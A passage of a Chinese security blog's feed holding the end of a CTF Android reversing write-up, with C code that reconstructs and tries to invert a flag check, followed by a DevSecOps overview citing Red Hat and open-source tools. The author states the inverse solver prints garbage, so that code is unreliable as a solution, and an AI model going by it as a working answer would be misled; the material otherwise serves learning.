alt="1571815444600.png"></p><p>其中v11是给出的数据块，按照int型，四位一个字段，正好28个字段。</p><p><img src="https://i.loli.net/2019/10/23/nfDS2o1K7k9pbvu.png" alt="1571815444618.png"></p><p>按照Java层逻辑和伪代码写出c代码为</p><pre><code>#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;int main(){    int v11[28] = {0x571a9693,0x23a96034,0x6a943d8c,0x1f9222ed,0x73887c81,0x5c13a257,0x26407522,0x13646a3a,0x2139537f,0x35415c5f,0x321304b7,0x238a8c26,0xd7307f6,0x622d5268,0x7c3d2e04,0x72198f7e,0x7df76af2,0x4e8431aa,0x28650861,0xfd8e3e9,0x196c1f1a,0x5fe8ab3,0x1231495d,0x5359d998,0x35fcfde0,0x3b2d0dd4,0x61113e45,0x314c57b8};   //小端字节序    int v0[28] = {0};    int string[28] = {0};   //未定义,引入的参数变量    int i;    for (i=0; i&lt;28; i++){        if (i == 0){            v0[i] = string[i] ^ 0xFF;        }        else{            v0[i] = string[i] ^ string[i-1];        }    }    srand(0x133ED6B);    int v4[28] = {0};    for (i=0; i&lt;28; i++){        v4[i] = v0[i] - rand();        if (v11[i] != v4[i]){            int v10 = 0;            return v10;        }    int v10 = 1;    printf(&quot;%c&quot;,v10);    return v10;    }}</code></pre><p>也就是我们需要反向求出string的值</p><pre><code>#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;int main(){    int v11[28] = {0x571a9693,0x23a96034,0x6a943d8c,0x1f9222ed,0x73887c81,0x5c13a257,0x26407522,0x13646a3a,0x2139537f,0x35415c5f,0x321304b7,0x238a8c26,0xd7307f6,0x622d5268,0x7c3d2e04,0x72198f7e,0x7df76af2,0x4e8431aa,0x28650861,0xfd8e3e9,0x196c1f1a,0x5fe8ab3,0x1231495d,0x5359d998,0x35fcfde0,0x3b2d0dd4,0x61113e45,0x314c57b8};    int v0[28] = {0};    srand(0x133ED6B);    for (int i=0; i&lt;28; i++){        v0[i] = v11[i] - rand();    }    int string[28] = {0};    for (int i=0; i&lt;28; i++){        if (i==0)            string[i] = v0[i] ^ 0xFF;        else{            string[i] = v0[i] ^ v0[i-1];        }    }    for (int i=0; i&lt;28; i++){        printf(&quot;%c&quot;, string[i]);    }    return 0;}</code></pre><p>但是尴尬的是算出来的是乱码</p><p><img src="https://i.loli.net/2019/10/23/qsJkNPHWw4FOmLV.png" alt="1571816373431.png"></p><p>然后没有找到这题的wp….也没找到其他问题的存在点。就这样吧，毕竟是汇编渣渣。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;BabyAndroid&quot;&gt;&lt;a href=&quot;#BabyAndroid&quot; class=&quot;headerlink&quot; title=&quot;BabyAndroid&quot;&gt;&lt;/a&gt;BabyAndroid&lt;/h3&gt;&lt;p&gt;常规，JEB反编译&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https:/
      
    
    </summary>
    
    
      <category term="Android逆向" scheme="/tags/Android%E9%80%86%E5%90%91/"/>
    
  </entry>
  
  <entry>
    <title>DevSecOps</title>
    <link href="/2019/10/DevSecOps/"/>
    <id>/2019/10/DevSecOps/</id>
    <published>2019-10-15T05:59:55.000Z</published>
    <updated>2019-10-15T09:22:42.778Z</updated>
    
    <content type="html"><![CDATA[<h1 id="什么是-DevSecOps"><a href="#什么是-DevSecOps" class="headerlink" title="什么是 DevSecOps?"></a>什么是 DevSecOps?</h1><p>DevOps 不仅仅是开发和运营团队。如果您想要充分发挥出 DevOps 方法的敏捷性和响应力，则必须在应用的整个生命周期内同时兼顾 IT 安全性。</p><p>为什么？以往，安全性会在开发的最后阶段由特定的团队来负责实现。当开发周期长达数月、甚至数年时，上述做法不存在任何问题；但是，这种做法现在已经行不通了。有效的 DevOps 可顺利推进快速频繁的开发周期（有时全程只有数周或数天），但是过时的安全措施会对此造成负面影响，即使对于最高效的 DevOps 计划也是如此。</p><p><img src="https://i.loli.net/2019/10/15/K2QagWyBve19szV.png" alt="devsecopslinear405x259_0.png"></p><p>现在，安全防护在 DevOps 协作框架中属于共同责任，而且需要在整个周期中整合相应的安全功能。这是一个非常重要的理念。它还使得“DevSecOps”一词应运而生，以用于强调必须为 DevOps 计划打下扎实的安全基础。</p><p><img src="https://i.loli.net/2019/10/15/4ILjYnVaUBRWKsN.png" alt="devsecopscollab405x308_0.png"></p><p>DevSecOps 意味着，从一开始就要考虑应用和基础架构的安全性；同时还要让某些安全网关实现自动化，以防止 DevOps 工作流程变慢。选择正确的工具来持续确保安全性有助于实现安全目标。但是，有效的 DevOps 安全防护需要的不仅是新工具。它建立在 DevOps 文化变革的基础上，以便尽早集成安全团队的工作。</p><hr><h2 id="DevOps-安全性为内置特性"><a href="#DevOps-安全性为内置特性" class="headerlink" title="DevOps 安全性为内置特性"></a>DevOps 安全性为内置特性</h2><p>无论您将其称为“DevOps”还是“DevSecOps”，最好始终能在应用的整个生命周期内确保安全性。DevSecOps 关乎内置安全性，而不是应用和数据层面的安全性。如果将安全性问题留到开发流程的最后环节再加以考虑，那么采用 DevOps 方案的组织会发现自己的开发周期又变长了，而这是他们从一开始就想要避免的情况。</p><p>在某种程度上，DevSecOps 强调，在 DevOps 计划刚启动时就要邀请安全团队来确保信息的安全性，并制定自动安全防护计划。它还强调，要帮助开发人员从代码层面确保安全性；在这个过程中，安全团队需要针对已知的威胁分享可见性信息、提供反馈并进行智能分析。这可能还包括为开发人员提供新的安全培训，因为 DevSecOps 并非始终着眼于较为传统的应用开发模式。</p><p>那么，怎样才算是真正地实现了内置安全性？对于新手而言，优质的 DevSecOps 策略应能确定风险承受能力并进行风险/收益分析。在一个给定的应用中，需要配备多少个安全控制功能？对于不同的应用，上市速度又有多重要？自动执行重复任务是 DevSecOps 的关键所在，因为在管道中运行手动安全检查可能会非常耗时。</p><hr><h2 id="DevOps-安全性可自动实现"><a href="#DevOps-安全性可自动实现" class="headerlink" title="DevOps 安全性可自动实现"></a>DevOps 安全性可自动实现</h2><p>企业应该：确保采用时间短、频率高的开发周期；采取安全措施，以最大限度地缩短运营中断时间；采用创新技术，如容器和微服务；同时，还要促使常见的孤立团队加强合作 — 这对所有企业来说都是一项艰巨的任务。上述所有举措都与人有关，而且企业内部需要协同合作；但是，自动化才是有助于在 DevSecOps 框架中实现这些人员变化的关键所在。</p><p><img src="https://i.loli.net/2019/10/15/NPKhfVESyG4C2tj.png" alt="devsecopsautomation3549x160.png"></p><p>那么，企业应该在哪些方面实现自动化？具体又该怎么做呢？红帽提供了相应的书面指南来帮助解答上述问题。企业应该退后一步，并着眼于整个开发和运营环境。其中涉及：源控制存储库；容器注册表；持续集成和持续部署 (CI/CD) 管道；应用编程接口 (API) 的管理、编排和发布自动化；以及运营管理和监控。</p><p>全新的自动化技术已帮助企业提高了开发实践的敏捷性，还在推动采用新的安全措施方面起到了重要作用。但是，自动化并不是近年来 IT 领域发生的唯一变化。现在，对于大多数 DevOps 计划而言，容器和微服务等云原生技术也是一个非常重要的组成部分。所以，企业必须调整 DevOps 安全措施，以适应这些技术。</p><hr><h2 id="DevOps-安全性适用于容器和微服务"><a href="#DevOps-安全性适用于容器和微服务" class="headerlink" title="DevOps 安全性适用于容器和微服务"></a>DevOps 安全性适用于容器和微服务</h2><p>可通过容器实现的规模扩展和基础架构动态性提升改变了许多组织开展业务的方式。因此，DevOps 安全性实践必须适应新环境并遵循特定于容器的安全准则。云原生技术不适合用来落实静态安全策略和检查清单。相反，组织必须在应用和基础架构生命周期的每个阶段确保持续安全并整合相应的安全功能。</p><p>DevSecOps 意味着，要在应用开发的整个过程中确保安全性。要实现与管道的这种集成需要秉持一种全新的思维方式，就像使用新工具一样。考虑到这一点，DevOps 团队应该实现安全防护自动化，以保护整体环境和数据；同时实现持续集成/持续交付流程——可能还要确保容器中的微服务的安全性。</p><h3 id="环境和数据安全性："><a href="#环境和数据安全性：" class="headerlink" title="环境和数据安全性："></a>环境和数据安全性：</h3><h4 id="实现环境的标准化和自动化。"><a href="#实现环境的标准化和自动化。" class="headerlink" title="实现环境的标准化和自动化。"></a>实现环境的标准化和自动化。</h4><p>每项服务都应具有最小的权限，以最大限度地减少未经授权的连接和访问。</p><h4 id="实现用户身份和访问控制功能的集中化。"><a href="#实现用户身份和访问控制功能的集中化。" class="headerlink" title="实现用户身份和访问控制功能的集中化。"></a>实现用户身份和访问控制功能的集中化。</h4><p>由于要在多个点发起身份验证，因此严格的访问控制和集中式身份验证机制对于确保微服务安全性而言至关重要。</p><h4 id="使运行微服务的容器相互隔离并与网络隔离。"><a href="#使运行微服务的容器相互隔离并与网络隔离。" class="headerlink" title="使运行微服务的容器相互隔离并与网络隔离。"></a>使运行微服务的容器相互隔离并与网络隔离。</h4><p>这包括传输中和静止的数据，因为获取这两类数据是攻击者的高价值目标。</p><h4 id="加密应用与服务间的数据。"><a href="#加密应用与服务间的数据。" class="headerlink" title="加密应用与服务间的数据。"></a>加密应用与服务间的数据。</h4><p>具有集成式安全功能的容器编排平台有助于最大限度地降低发生未经授权访问的可能性。</p><h4 id="引入安全的-API-网关。"><a href="#引入安全的-API-网关。" class="headerlink" title="引入安全的 API 网关。"></a>引入安全的 API 网关。</h4><p>安全的 API 可提高授权和路由的可见性。通过减少公开的 API，组织可以减小攻击面。</p><h3 id="CI-CD-流程安全性："><a href="#CI-CD-流程安全性：" class="headerlink" title="CI/CD 流程安全性："></a>CI/CD 流程安全性：</h3><h4 id="集成适用于容器的安全性扫描程序。"><a href="#集成适用于容器的安全性扫描程序。" class="headerlink" title="集成适用于容器的安全性扫描程序。"></a>集成适用于容器的安全性扫描程序。</h4><p>应在向注册表添加容器的过程中实现这一点。</p><h4 id="自动在-CI-过程中完成安全性测试。"><a href="#自动在-CI-过程中完成安全性测试。" class="headerlink" title="自动在 CI 过程中完成安全性测试。"></a>自动在 CI 过程中完成安全性测试。</h4><p>其中包括在构建过程中运行安全性静态分析工具；而且在构建管道中提取任何预构建容器映像时，都要进行扫描，以检查是否存在已知的安全漏洞。</p><h4 id="在验收测试流程中加入针对安全性功能的自动化测试。"><a href="#在验收测试流程中加入针对安全性功能的自动化测试。" class="headerlink" title="在验收测试流程中加入针对安全性功能的自动化测试。"></a>在验收测试流程中加入针对安全性功能的自动化测试。</h4><p>自动执行输入验证测试，并针对验证操作实现身份验证和授权功能的自动化。</p><h4 id="自动执行安全性更新，例如针对已知漏洞打修补。"><a href="#自动执行安全性更新，例如针对已知漏洞打修补。" class="headerlink" title="自动执行安全性更新，例如针对已知漏洞打修补。"></a>自动执行安全性更新，例如针对已知漏洞打修补。</h4><p>通过 DevOps 实现这一点。这样，在创建记录在案的可跟踪更改日志时，管理员便无需登录生产系统。</p><h4 id="实现系统和服务配置管理功能的自动化。"><a href="#实现系统和服务配置管理功能的自动化。" class="headerlink" title="实现系统和服务配置管理功能的自动化。"></a>实现系统和服务配置管理功能的自动化。</h4><p>这样可以确保遵守安全策略，避免出现人为错误。审核和补救操作也应实现自动化。</p><p>以上信息来源：<a href="https://www.redhat.com/zh/topics/devops/what-is-devsecops" target="_blank" rel="noopener">https://www.redhat.com/zh/topics/devops/what-is-devsecops</a></p><h1 id="DevSevOps-部分实现方案"><a href="#DevSevOps-部分实现方案" class="headerlink" title="DevSevOps 部分实现方案"></a>DevSevOps 部分实现方案</h1><p>DevSecOps的目标是在短时间内使各种能力的人提高安全性。传统安全性的出发点是，一旦设计了系统，便可以由安全人员确定其安全缺陷，并由业务运营商在发布系统之前对其进行纠正。这允许将有限的安全检查应用于项目，并且避免了在大型系统中增加安全测试环境的需要。但是，以这种方式设计的流程仅在业务活动步伐迅猛且各方都同意的情况下才有效。不幸的是，安全性必须得以保证的理念逐渐被要求后，这个迭代过程便存在安全缺陷，并且此后在系统内部造成了固有风险。</p><p><a href="https://github.com/archerysec/archerysec" target="_blank" rel="noopener">archerysec</a>: 是一个开源漏洞评估和管理工具，可帮助开发人员和渗透测试人员执行扫描和管理漏洞。准确的说这并不是一个完整的DevSecOps实现方案，但是在一般的DevOps中，不需要对Sec进行较大的投入下，满足的基本安全性能保证。当然也可以理解为，开发人员人手一个AWVS、openVAS扫描。</p><p>Gitlab+Jenkins+SonarQube：实现动态的代码审计，自动拖代码扫描出结果。目前据所知，有不少企业在这种方式上，开发Sonar插件来进行代码审计的安全性维护。</p><p>后面会采用开源的安全架构来实现Sec的功能，内容希望可以类似<a href="https://bloodzer0.github.io/ossa/" target="_blank" rel="noopener">ossa</a>，但又没必要这么全面。同样部分开源工具也和DevSecOps没太大关系的，但既然DevSecOps是为了每一个人的安全，开源工具在中小型甲方就有较大意义了。</p><p>参考文章：</p><p><a href="https://www.linkedin.com/pulse/what-devsecops-shannon-lietz?trkInfo=VSRPsearchId%3A946311454203481351%2CVSRPtargetId%3A6008272002333294592%2CVSRPcmpt%3Aprimary&amp;trk=vsrp_influencer_content_res_name" target="_blank" rel="noopener">What is DevSecOps?</a></p><p><a href="https://www.microsoft.com/en-us/securityengineering/sdl/threatmodeling" target="_blank" rel="noopener">Threat Modeling</a></p><p><a href="https://christian-schneider.net/slides/OWASP-AppSecEU-2015_SecDevOps.pdf" target="_blank" rel="noopener">OWASP-AppSecEU</a></p><p><a href="https://github.com/devsecops/awesome-devsecops" target="_blank" rel="noopener">awesome-devsecops</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;什么是-DevSecOps&quot;&gt;&lt;a href=&quot;#什么是-DevSecOps&quot; class=&quot;headerlink&quot; title=&quot;什么是 DevSecOps?&quot;&gt;&lt;/a&gt;什么是 DevSecOps?&lt;/h1&gt;&lt;p&gt;DevOps 不仅仅是开发和运营团队。如果您想要
      
    
    </summary>
    
    
      <category term="Open Source Security" scheme="/tags/Open-Source-Security/"/>
    
  </entry>
  
</feed>
